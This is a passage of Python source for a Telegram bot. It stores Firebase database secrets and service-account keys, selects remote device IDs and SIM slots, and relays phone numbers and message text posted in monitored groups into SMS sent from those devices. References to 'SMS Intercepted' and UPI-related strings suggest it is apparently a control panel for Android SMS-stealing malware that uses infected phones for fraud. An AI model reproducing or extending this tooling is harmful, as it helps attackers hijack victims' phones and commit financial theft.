    if json_data or "?auth=" in text or "access_token=" in text:
        return await add_private_firebase_handler(update, context)
    return await add_public_firebase_handler(update, context)


async def add_firebase_secret_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Second step of private Firebase: plain Database Secret or Service Account JSON."""
    if not await require_access(update, context):
        return ConversationHandler.END

    msg = update.message
    text = (msg.text or "").strip() if msg else ""

    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
        "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        context.user_data.pop("pending_firebase_url", None)
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)
    # IMPORTANT: peek, do not pop until save succeeds (old bug: secret retry = session expired)
    url = context.user_data.get("pending_firebase_url")

    if not url:
        await msg.reply_text(
            "❌ Session expired / URL missing.\n"
            "🔒 Add Private Firebase se URL dubara bhejein.",
            reply_markup=get_main_keyboard(user_cfg),
        )
        return MAIN_MENU

    # Service Account JSON (file or paste)
    json_data, json_err = await extract_json_from_message(update, context)
    if json_err and msg and msg.document:
        # keep pending URL — user can still send plain secret
        await msg.reply_text(
            f"❌ {json_err}\n\n"
            "Valid <code>.json</code> bhejein, ya Database Secret plain text me paste karein.",
            parse_mode=ParseMode.HTML,
        )
        return ADD_FIREBASE_SECRET

    if json_data:
        is_valid, project_id, default_url, sa_err = parse_service_account_dict(json_data)
        if not is_valid:
            await msg.reply_text(
                (sa_err or "❌ Invalid Service Account JSON.")
                + "\n\nYa Database Secret plain text me bhej sakte ho.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return ADD_FIREBASE_SECRET
        return await _save_private_firebase_and_prompt(
            update, context, user_id, user_cfg,
            url=url or default_url,
            service_account=json_data,
            project_id=project_id or "",
            mode_label="🔒 Private (Service Account Key)",
        )

    # Plain-text Database Secret
    secret = clean_database_secret(text)
    if not secret:
        await msg.reply_text(
            "❌ Empty secret.\n\n"
            "Database Secret plain text me paste karein, ya Service Account `.json` upload karein.",
        )
        return ADD_FIREBASE_SECRET

    # If user re-pasted full URL?auth=secret on this step
    if secret.startswith("http://") or secret.startswith("https://") or "auth=" in text:
        clean_u, sec2 = parse_firebase_input(text)
        if sec2:
            context.user_data["pending_firebase_url"] = clean_u or url
            secret = sec2
            url = clean_u or url
        elif validate_firebase_url(text) and not clean_database_secret(text).startswith("http"):
            pass

    return await _save_private_firebase_and_prompt(
        update, context, user_id, user_cfg,
        url=url,
        secret=secret,
        mode_label="🔒 Private (Database Secret)",
    )

async def add_group_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    text = (update.message.text or "").strip()

    # If user pressed any menu / sub-menu button → execute that button's real function
    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)
    msg = update.message

    # Forward detection
    target = None
    if msg.forward_origin and hasattr(msg.forward_origin, "chat"):
        target = msg.forward_origin.chat

    if target:
        gid = str(target.id)
        title = target.title or gid
        logger.info(f"➕ Adding group via forward: id={gid} title={title} user={user_id}")

        if any(str(g["id"]) == gid for g in user_cfg.get("monitored_groups", [])):
            await update.message.reply_text(
                "❌ Already monitoring this group/channel.",
                reply_markup=get_main_keyboard(user_cfg)
            )
            return MAIN_MENU

        user_cfg.setdefault("monitored_groups", []).append({"id": gid, "title": title})
        save_user_config(user_id, user_cfg)
        await update.message.reply_text(
            f"✅ Added `{title}`\nID: `{gid}`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_keyboard(user_cfg)
        )
        return MAIN_MENU

    if text:
        if any(x in text for x in [
            "SMS Intercepted", "To:", "Message:", "One-tap copy",
            "FAVEUPI", "UPIUCO", "Intercepted Outgoing", "Body (Tap to copy)"
        ]):
            await update.message.reply_text(
                "❌ That looks like an SMS message, not a group/channel.\n\n"
                "Please forward a message from the group/channel\n"
                "or send the @username / invite link.",
                reply_markup=get_main_keyboard(user_cfg)
            )
            return MAIN_MENU

        try:
            chat = await context.bot.get_chat(text)
            if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                gid = str(chat.id)
                title = chat.title or gid
                logger.info(f"➕ Adding group via link/username: id={gid} title={title} user={user_id}")

                if any(str(g["id"]) == gid for g in user_cfg.get("monitored_groups", [])):
                    await update.message.reply_text(
                        "❌ Already monitoring this group/channel.",
                        reply_markup=get_main_keyboard(user_cfg)
                    )
                    return MAIN_MENU

                user_cfg.setdefault("monitored_groups", []).append({"id": gid, "title": title})
                save_user_config(user_id, user_cfg)
                await update.message.reply_text(
                    f"✅ Added `{title}`\nID: `{gid}`",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=get_main_keyboard(user_cfg)
                )
                return MAIN_MENU
            else:
                await update.message.reply_text(
                    "❌ This is not a group or channel.",
                    reply_markup=get_main_keyboard(user_cfg)
                )
                return MAIN_MENU

        except Exception as e:
            logger.error(f"Could not resolve chat '{text}': {e}")
            await update.message.reply_text(
                "❌ Could not find that group/channel.\n\n"
                "Make sure:\n"
                "• The link/username is correct\n"
                "• The bot is already an admin in the channel\n"
                "• Or just forward any message from the channel\n\n"
                f"Error: {str(e)[:120]}",
                reply_markup=get_main_keyboard(user_cfg)
            )
            return MAIN_MENU

    await update.message.reply_text(
        "❌ Could not identify the group/channel.\n"
        "Please forward a message from it or send the @username / invite link.",
        reply_markup=get_main_keyboard(user_cfg)
    )
    return MAIN_MENU

async def awaiting_sim_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    text = (update.message.text or "").strip()

    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    try:
        idx = int(text)
        user_cfg["sim_index"] = idx
        save_user_config(user_id, user_cfg)
        await update.message.reply_text(
            f"📶 SIM {idx + 1} selected.",
            reply_markup=get_main_keyboard(user_cfg)
        )
        return MAIN_MENU
    except ValueError:
        await update.message.reply_text(
            "❌ Please send a number (0, 1, 2...)\nor press any button to cancel."
        )
        return AWAITING_SIM

async def awaiting_device_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return ConversationHandler.END

    text = (update.message.text or "").strip()
    menu_buttons = {
        "📊 Status", "📁 Manage Firebase", "📱 Device", "📶 SIM", "👥 Group",
        "🔔 Start Reply", "🔔 Stop Reply",
        "▶️ Start Auto Token Sender", "⏸️ Stop Auto Token Sender",
        "➕ Add Firebase", "🌐 Add Public Firebase", "🔒 Add Private Firebase",
        "🗑️ Delete Firebase", "📋 Select Firebase",
        "➕ Add Group", "➖ Delete Group", "📋 Select Group",
        "🔙 Back"
    }
    if text in menu_buttons:
        return await main_menu_handler(update, context)

    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)
    did = text
    user_cfg["device_id"] = did
    save_user_config(user_id, user_cfg)
    data = get_device_data(user_cfg, did)
    sims = extract_sims(data) if data else []
    if len(sims) == 1:
        user_cfg["sim_index"] = sims[0]["index"]
        save_user_config(user_id, user_cfg)
        await update.message.reply_text(
            f"✅ Device <code>{did}</code> + SIM {sims[0]['index']+1} set.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_keyboard(user_cfg)
        )
        return MAIN_MENU
    elif len(sims) > 1:
        kb = [[InlineKeyboardButton(s["label"], callback_data=f"free_sim|{s['index']}")] for s in sims]
        kb.append([InlineKeyboardButton("✏️ Manual", callback_data="free_sim_manual")])
        kb.append([InlineKeyboardButton("🔙 Skip", callback_data="free_sim_skip")])
        await update.message.reply_text(
            f"✅ Device <code>{did}</code> set.\nSelect SIM:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return MAIN_MENU
    else:
        await update.message.reply_text(
            f"✅ Device <code>{did}</code> saved.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_keyboard(user_cfg)
        )
        return MAIN_MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_cfg = get_user_config(update.effective_user.id)
    await update.message.reply_text("Cancelled.", reply_markup=get_main_keyboard(user_cfg))
    return MAIN_MENU

# ===================== CALLBACKS =====================
async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return
    q = update.callback_query
    await q.answer()
    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)
    data_s = q.data or ""

    if data_s == "device_cancel":
        context.user_data.pop("device_page", None)
        context.user_data.pop("force_show_all_devices", None)
        context.user_data.pop("awaiting_device", None)
        await q.edit_message_text("Cancelled.")
        return

    if data_s == "device_manual":
        context.user_data["awaiting_device"] = True
        await q.edit_message_text(
            "📱 <b>Send your Device ID as next message:</b>\n\n"
            "Example: <code>0097fee50318c6ad</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if data_s == "device_show_all":
        context.user_data["device_page"] = 0
        context.user_data["force_show_all_devices"] = True
        await prompt_device_selection(update, context, user_cfg)
        return

    if data_s == "device_show_online":
        context.user_data["device_page"] = 0
        context.user_data.pop("force_show_all_devices", None)
        await prompt_device_selection(update, context, user_cfg)
        return

    if data_s.startswith("device_page|"):
        try:
            context.user_data["device_page"] = int(data_s.split("|", 1)[1])
        except Exception:
            context.user_data["device_page"] = 0
        await prompt_device_selection(update, context, user_cfg)
        return

    if not data_s.startswith("device|"):
        return

    _, did = data_s.split("|", 1)
    user_cfg["device_id"] = did
    save_user_config(user_id, user_cfg)
    data = get_device_data(user_cfg, did)
    if not data:
        await q.edit_message_text(f"✅ Device `{did}` set (no SIM info).")
        return
    sims = extract_sims(data)
    if len(sims) == 1:
        user_cfg["sim_index"] = sims[0]["index"]
        save_user_config(user_id, user_cfg)
        await q.edit_message_text(f"✅ Device `{did}` + SIM {sims[0]['index']+1} set.")
    else:
        kb = [[InlineKeyboardButton(s["label"], callback_data=f"free_sim|{s['index']}")] for s in sims]
        kb.append([InlineKeyboardButton("✏️ Manual", callback_data="free_sim_manual")])
        kb.append([InlineKeyboardButton("🔙 Skip", callback_data="free_sim_skip")])
        await q.edit_message_text(f"✅ Device `{did}` set.\nSelect SIM:", reply_markup=InlineKeyboardMarkup(kb))

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return
    q = update.callback_query
    await q.answer()
    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    if q.data == "free_sim_skip":
        await q.edit_message_text("SIM skipped.")
        return
    if q.data == "free_sim_manual":
        await q.edit_message_text("📶 Type SIM index (0, 1, 2...):")
        return

    _, idx = q.data.split("|", 1)
    user_cfg["sim_index"] = int(idx)
    save_user_config(user_id, user_cfg)
    await q.edit_message_text(f"📶 SIM {int(idx)+1} selected.")

async def firebase_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return
    q = update.callback_query
    await q.answer()
    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    if q.data in ("del_fb_cancel", "sel_fb_cancel"):
        await q.edit_message_text("Cancelled.")
        return

    if q.data.startswith("del_fb|"):
        idx = int(q.data.split("|")[1])
        lst = user_cfg.get("firebase_list", [])
        if 0 <= idx < len(lst):
            item = lst[idx]
            url = item.get("url") if isinstance(item, dict) else str(item)
            sec = item.get("secret") if isinstance(item, dict) else ""
            sa = item.get("service_account") if isinstance(item, dict) else None
            lock = "🔒 " if (sec or sa) else "🌐 "
            kb = [
                [InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_del_fb|{idx}")],
                [InlineKeyboardButton("❌ Cancel", callback_data="del_fb_cancel")]
            ]
            await q.edit_message_text(f"⚠️ Delete?\n`{lock}{url}`", parse_mode=ParseMode.MARKDOWN,
                                      reply_markup=InlineKeyboardMarkup(kb))
        return

    if q.data.startswith("confirm_del_fb|"):
        idx = int(q.data.split("|")[1])
        lst = user_cfg.get("firebase_list", [])
        if 0 <= idx < len(lst):
            removed = lst.pop(idx)
            r_url = removed.get("url") if isinstance(removed, dict) else str(removed)
            active = user_cfg.get("active_firebase_index", 0)
            if idx <= active:
                user_cfg["active_firebase_index"] = max(0, active - 1) if lst else 0
            save_user_config(user_id, user_cfg)
            await q.edit_message_text(f"🗑️ Deleted\n`{r_url}`", parse_mode=ParseMode.MARKDOWN)
        return

    if q.data.startswith("sel_fb|"):
        idx = int(q.data.split("|")[1])
        lst = user_cfg.get("firebase_list", [])
        if 0 <= idx < len(lst):
            user_cfg["active_firebase_index"] = idx
            save_user_config(user_id, user_cfg)
            item = lst[idx]
            url = item.get("url") if isinstance(item, dict) else str(item)
            sec = item.get("secret") if isinstance(item, dict) else ""
            sa = item.get("service_account") if isinstance(item, dict) else None
            if sa:
                mode = " (🔒 Private - Service Account)"
            elif sec:
                mode = " (🔒 Private - Secret)"
            else:
                mode = " (🌐 Public)"
            await q.edit_message_text(f"✅ Active:\n`{url}`{mode}", parse_mode=ParseMode.MARKDOWN)
            await prompt_device_selection(update, context, user_cfg)

async def group_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return
    q = update.callback_query
    await q.answer()
    user_id = update.effective_user.id
    user_cfg = get_user_config(user_id)

    if q.data in ("remove_cancel", "sel_group_cancel"):
        await q.edit_message_text("Cancelled.")
        return

    if q.data.startswith("remove_group|"):
        gid = q.data.split("|", 1)[1]
        title = get_group_title(user_cfg, gid)
        kb = [
            [InlineKeyboardButton("✅ Yes, Remove", callback_data=f"confirm_remove|{gid}")],
            [InlineKeyboardButton("❌ Cancel", callback_data="remove_cancel")]
        ]
        await q.edit_message_text(f"⚠️ Stop monitoring?\n`{title}`", parse_mode=ParseMode.MARKDOWN,
                                  reply_markup=InlineKeyboardMarkup(kb))
        return

    if q.data.startswith("confirm_remove|"):
        gid = q.data.split("|", 1)[1]
        user_cfg["monitored_groups"] = [g for g in user_cfg.get("monitored_groups", []) if str(g["id"]) != str(gid)]
        save_user_config(user_id, user_cfg)
        await q.edit_message_text("✅ Removed.")
        return

    if q.data.startswith("sel_group|"):
        gid = q.data.split("|", 1)[1]
        title = get_group_title(user_cfg, gid)
        await q.edit_message_text(f"📌 `{title}` is monitored.\nID: `{gid}`", parse_mode=ParseMode.MARKDOWN)

# ===================== AUTO CLEAN =====================
async def on_my_chat_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
    result = update.my_chat_member
    if not result:
        return
    old = result.old_chat_member.status
    new = result.new_chat_member.status
    chat = result.chat

    if new in (ChatMemberStatus.LEFT, ChatMemberStatus.BANNED) and old in (
        ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.RESTRICTED
    ):
        gid = str(chat.id)
        logger.info(f"Bot left/kicked from {chat.title or gid}")
        remove_group_from_all_users(gid)

# ===================== GROUP / CHANNEL MESSAGE =====================
async def group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    if not msg:
        return

    chat = update.effective_chat
    chat_id = str(chat.id)
    current_title = chat.title or chat_id
    text = msg.text or msg.caption or ""

    logger.info("=" * 60)
    logger.info(f"📩 MESSAGE RECEIVED")
    logger.info(f"   chat_id      = {chat_id}")
    logger.info(f"   title        = {current_title}")
    logger.info(f"   chat.type    = {chat.type}")
    logger.info(f"   text preview = {text[:180]}")

    with cache_lock:
        monitored_by = list(group_index.get(chat_id, set()))
        logger.info(f"   users monitoring this chat_id = {monitored_by}")

    to_num, sms = parse_message(text)
    logger.info(f"   parse result → to={to_num} | msg={(sms[:80] + '...') if sms and len(sms) > 80 else sms}")
    logger.info("=" * 60)

    update_group_title(chat_id, current_title)

    if not to_num or not sms:
        return

    # Validate phone number on raw (un-escaped) value
    if not validate_phone_number(to_num):
        logger.info(f"   ❌ Invalid phone number: {to_num}")
        return

    # Sanitize only for display/reply, not for the actual SMS payload
    to_num_display = html.escape(to_num)
    sms_raw = sms  # send raw SMS text to Firebase

    with cache_lock:
        user_ids = list(group_index.get(chat_id, set()))

    if not user_ids:
        logger.info(f"   ⚠️ No users monitoring chat_id={chat_id}")
        return

    for uid_str in user_ids:
        if uid_str in banned_set:
            continue

        with cache_lock:
            cfg = copy.deepcopy(user_cache.get(uid_str))
            if not cfg:
                continue
            parsing = cfg.get("parsing_enabled", True)
            did = cfg.get("device_id")
            confirm = cfg.get("confirm_reply", False)

        if not parsing:
            logger.info(f"   ⏭️ User {uid_str}: parsing_enabled=OFF")
            continue
        if not did:
            logger.info(f"   ⏭️ User {uid_str}: no device selected")
            continue

        async def _send(c=cfg, uid=uid_str, conf=confirm):
            success, reason = await send_sms_async(c, to_num, sms_raw)
            if conf:
                try:
                    if success:
                        await msg.reply_text(f"✅ Sent to <code>{to_num_display}</code>", parse_mode=ParseMode.HTML)
                    else:
                        detail = diagnose_failure(c)
                        await msg.reply_text(
                            f"❌ Failed to <code>{to_num_display}</code>\nReason: {html.escape(detail)}",
                            parse_mode=ParseMode.HTML
                        )
                except Exception as e:
                    logger.warning(f"Could not reply in chat: {e}")
            logger.info(f"📤 {uid}: {'OK' if success else reason} → {to_num}")

        asyncio.create_task(_send())

# ===================== ERROR =====================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}", exc_info=context.error)


# ===================== LIVE RELOAD (panel → bot) =====================
async def watch_panel_changes(context: ContextTypes.DEFAULT_TYPE):
    """
    Every few seconds: if settings.json / bot_data.db / .reload_flag changed,
    reload config + user cache so panel edits apply without full restart
    (BOT_TOKEN change still needs full process restart).
    """
    global _settings_mtime, _db_mtime
    try:
        # explicit flag from panel
        if os.path.isfile(RELOAD_FLAG):
            try:
                os.remove(RELOAD_FLAG)
            except Exception:
                pass
            info = reload_runtime_config()
            load_cache()
            logger.info(f"🔄 Panel reload flag → config+cache refreshed | {info}")
            return

        need_cfg = False
        need_db = False
        try:
            if os.path.isfile(SETTINGS_FILE):
                mt = os.path.getmtime(SETTINGS_FILE)
                if mt > _settings_mtime + 0.01:
                    need_cfg = True
        except Exception:
            pass
        try:
            if os.path.isfile(DB_FILE):
                mt = os.path.getmtime(DB_FILE)
                if _db_mtime <= 0:
                    _db_mtime = mt
                elif mt > _db_mtime + 0.01:
                    need_db = True
                    _db_mtime = mt
        except Exception:
            pass

        if need_cfg:
            info = reload_runtime_config()
            logger.info(f"🔄 settings.json changed → config reloaded | {info}")
        if need_db:
            load_cache()
            logger.info("🔄 bot_data.db changed → user cache reloaded from panel writes")
    except Exception as e:
        logger.warning(f"watch_panel_changes: {e}")


# ===================== MAIN =====================
async def main():
    info = reload_runtime_config()
    init_db()
    migrate_from_json()
    load_cache()
    try:
        global _db_mtime
        _db_mtime = os.path.getmtime(DB_FILE) if os.path.isfile(DB_FILE) else 0.0
    except Exception:
        _db_mtime = 0.0
    logger.info(
        f"⚙️ Runtime config | token={'yes' if BOT_TOKEN else 'NO'} | "
        f"admins={ADMIN_IDS} | channel={CHANNEL_USERNAME or 'off'}"
    )

    if not BOT_TOKEN:
        logger.critical("BOT_TOKEN required")
        sys.exit(1)

    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu_handler)],
            ADD_FIREBASE: [
                MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, add_firebase_handler),
                CommandHandler("start", start),
            ],
            ADD_PUBLIC_FIREBASE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_public_firebase_handler),
                CommandHandler("start", start),
            ],
            ADD_PRIVATE_FIREBASE: [
                MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, add_private_firebase_handler),
                CommandHandler("start", start),
            ],
            ADD_FIREBASE_SECRET: [
                MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, add_firebase_secret_handler),
                CommandHandler("start", start),
            ],
            ADD_GROUP: [
                MessageHandler(filters.ALL & ~filters.COMMAND, add_group_handler),
                CommandHandler("start", start),
            ],
            AWAITING_SIM: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, awaiting_sim_handler),
                CommandHandler("start", start),
            ],
            AWAITING_DEVICE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, awaiting_device_handler),
                CommandHandler("start", start),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),
        ],
        allow_reentry=True,
    )

    app.add_handler(conv)

    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("userinfo", cmd_userinfo))
    app.add_handler(CommandHandler("deleteuser", cmd_deleteuser))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("banned", cmd_banned))
    app.add_handler(CommandHandler("debuggroup", cmd_debuggroup))

    app.add_handler(CallbackQueryHandler(device_callback, pattern=r"^device"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern=r"^free_sim"))
    app.add_handler(CallbackQueryHandler(firebase_callback, pattern=r"^(del_fb|confirm_del_fb|sel_fb)"))
    app.add_handler(CallbackQueryHandler(group_callback, pattern=r"^(remove_group|confirm_remove|sel_group|remove_cancel|sel_group_cancel)"))

    app.add_handler(ChatMemberHandler(on_my_chat_member, ChatMemberHandler.MY_CHAT_MEMBER))

    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & (
            filters.ChatType.GROUPS
            | filters.ChatType.SUPERGROUP
            | filters.ChatType.CHANNEL
        ),
        group_message
    ))
    # Also handle caption-only messages (forwarded media with text)
    # Panel live-reload watcher (settings.json + bot_data.db)
    if app.job_queue:
        app.job_queue.run_repeating(watch_panel_changes, interval=4, first=3)
        logger.info("⏱️ Panel watch job registered (4s)")
    else:
        logger.warning("job_queue missing — install python-telegram-bot[job-queue] for live panel reload")

    app.add_handler(MessageHandler(
        filters.CAPTION & ~filters.COMMAND & (
            filters.ChatType.GROUPS
            | filters.ChatType.SUPERGROUP
            | filters.ChatType.CHANNEL
        ),
        group_message
    ))

    app.add_error_handler(error_handler)

    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)
    logger.info("✅ Bot running (proper button handling inside Add Firebase / Add Group)")

    stop_event = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop_event.set)
        except NotImplementedError:
            pass
    await stop_event.wait()

    await app.updater.stop()
    await app.stop()
    await app.shutdown()
    logger.info("Bot stopped.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except RuntimeError as e:
        if "event loop is already running" in str(e).lower():
            loop = asyncio.get_event_loop()
            loop.create_task(main())
            try:
                loop.run_forever()
            except KeyboardInterrupt:
                pass
        else:
            raise